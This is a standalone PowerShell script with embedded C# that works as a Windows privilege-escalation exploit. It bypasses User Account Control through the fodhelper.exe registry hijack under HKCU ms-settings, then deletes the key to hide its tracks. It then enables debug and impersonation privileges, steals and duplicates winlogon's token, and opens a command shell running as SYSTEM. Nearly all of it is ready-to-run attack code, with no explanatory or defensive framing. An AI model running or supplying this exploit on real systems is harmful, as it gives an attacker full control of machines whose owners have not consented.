$CurrentIdentity = [Security.Principal.WindowsIdentity]::GetCurrent()
$Principal = New-Object Security.Principal.WindowsPrincipal($CurrentIdentity)

if (-not $Principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Write-Host "[*] Elevating via fodhelper..." -ForegroundColor Yellow
    
    $RegPath = "HKCU:\Software\Classes\ms-settings\Shell\Open\command"
    $Command = "powershell.exe -ExecutionPolicy Bypass -NoExit -File `"$PSCommandPath`""
    
    New-Item -Path $RegPath -Force | Out-Null
    New-ItemProperty -Path $RegPath -Name "DelegateExecute" -Value "" -Force | Out-Null
    Set-ItemProperty -Path $RegPath -Name "(Default)" -Value $Command | Out-Null
    
    Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden
    Start-Sleep -Seconds 2
    Remove-Item -Path "HKCU:\Software\Classes\ms-settings" -Recurse -Force -ErrorAction SilentlyContinue
    exit
}

Write-Host "[+] Running as Administrator" -ForegroundColor Green
Remove-Item -Path "HKCU:\Software\Classes\ms-settings" -Recurse -Force -ErrorAction SilentlyContinue

Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
using System.Diagnostics;

public class SystemSpawn {
    [DllImport("advapi32.dll", SetLastError = true)]
    static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);
    
    [DllImport("advapi32.dll", SetLastError = true)]
    static extern bool DuplicateTokenEx(IntPtr hToken, uint dwDesiredAccess, IntPtr lpTokenAttributes, int ImpersonationLevel, int TokenType, out IntPtr phNewToken);
    
    [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
    static extern bool CreateProcessWithTokenW(IntPtr hToken, uint dwLogonFlags, string lpAppName, string lpCmdLine, uint dwCreationFlags, IntPtr lpEnv, string lpCurDir, ref STARTUPINFO lpSi, out PROCESS_INFORMATION lpPi);
    
    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool CloseHandle(IntPtr hObject);
    
    [DllImport("advapi32.dll", SetLastError = true)]
    static extern bool LookupPrivilegeValue(string lpSysName, string lpName, out LUID lpLuid);
    
    [DllImport("advapi32.dll", SetLastError = true)]
    static extern bool AdjustTokenPrivileges(IntPtr TokenHandle, bool DisableAllPrivileges, ref TOKEN_PRIVILEGES NewState, uint BufferLength, IntPtr PreviousState, IntPtr ReturnLength);
    
    [DllImport("ntdll.dll", SetLastError = true)]
    static extern int NtSetInformationToken(IntPtr TokenHandle, int TokenInformationClass, ref uint TokenInformation, int TokenInformationLength);

    [StructLayout(LayoutKind.Sequential)] public struct LUID { public uint LowPart; public int HighPart; }
    [StructLayout(LayoutKind.Sequential)] public struct LUID_AND_ATTRIBUTES { public LUID Luid; public uint Attributes; }
    [StructLayout(LayoutKind.Sequential)] public struct TOKEN_PRIVILEGES { public uint PrivilegeCount; public LUID_AND_ATTRIBUTES Privileges; }
    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    public struct STARTUPINFO { public int cb; public string lpReserved; public string lpDesktop; public string lpTitle; public int dwX, dwY, dwXSize, dwYSize, dwXCountChars, dwYCountChars, dwFillAttribute, dwFlags; public short wShowWindow, cbReserved2; public IntPtr lpReserved2, hStdInput, hStdOutput, hStdError; }
    [StructLayout(LayoutKind.Sequential)] public struct PROCESS_INFORMATION { public IntPtr hProcess, hThread; public int dwProcessId, dwThreadId; }

    static void EnablePrivilege(string priv) {
        IntPtr hToken;
        OpenProcessToken(Process.GetCurrentProcess().Handle, 0x0020 | 0x0008, out hToken);
        TOKEN_PRIVILEGES tp = new TOKEN_PRIVILEGES();
        tp.PrivilegeCount = 1;
        tp.Privileges.Attributes = 0x00000002;
        LookupPrivilegeValue(null, priv, out tp.Privileges.Luid);
        AdjustTokenPrivileges(hToken, false, ref tp, 0, IntPtr.Zero, IntPtr.Zero);
        CloseHandle(hToken);
    }

    public static int Spawn() {
        EnablePrivilege("SeDebugPrivilege");
        EnablePrivilege("SeImpersonatePrivilege");
        EnablePrivilege("SeAssignPrimaryTokenPrivilege");
        
        Process[] procs = Process.GetProcessesByName("winlogon");
        if (procs.Length == 0) return -1;
        
        IntPtr hProc = procs[0].Handle;
        IntPtr hToken;
        if (!OpenProcessToken(hProc, 0x02000000, out hToken)) return Marshal.GetLastWin32Error();
        
        IntPtr hDup;
        if (!DuplicateTokenEx(hToken, 0x02000000, IntPtr.Zero, 2, 1, out hDup)) { CloseHandle(hToken); return Marshal.GetLastWin32Error(); }
        
        uint sessionId = (uint)Process.GetCurrentProcess().SessionId;
        NtSetInformationToken(hDup, 12, ref sessionId, sizeof(uint));
        
        STARTUPINFO si = new STARTUPINFO();
        si.cb = Marshal.SizeOf(si);
        si.lpDesktop = "WinSta0\\Default";
        PROCESS_INFORMATION pi;
        
        if (!CreateProcessWithTokenW(hDup, 0x00000002, "cmd.exe", "cmd.exe /k title SYSTEM && color 0a && whoami", 0x00000010, IntPtr.Zero, null, ref si, out pi)) {
            CloseHandle(hToken); CloseHandle(hDup);
            return Marshal.GetLastWin32Error();
        }
        
        CloseHandle(hToken); CloseHandle(hDup);
        CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
        return 0;
    }
}
"@

Write-Host "[*] Enabling privileges and spawning SYSTEM shell..." -ForegroundColor Cyan
$result = [SystemSpawn]::Spawn()

if ($result -eq 0) {
    Write-Host "[+] SYSTEM CMD spawned!" -ForegroundColor Green
    Write-Host "[!] Green CMD window should be on your taskbar!" -ForegroundColor Magenta
} elseif ($result -eq -1) {
    Write-Host "[-] winlogon.exe not found" -ForegroundColor Red
} else {
    Write-Host "[-] Failed with error: $result" -ForegroundColor Red
}

Write-Host "`nPress any key to exit..." -ForegroundColor Cyan
$null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
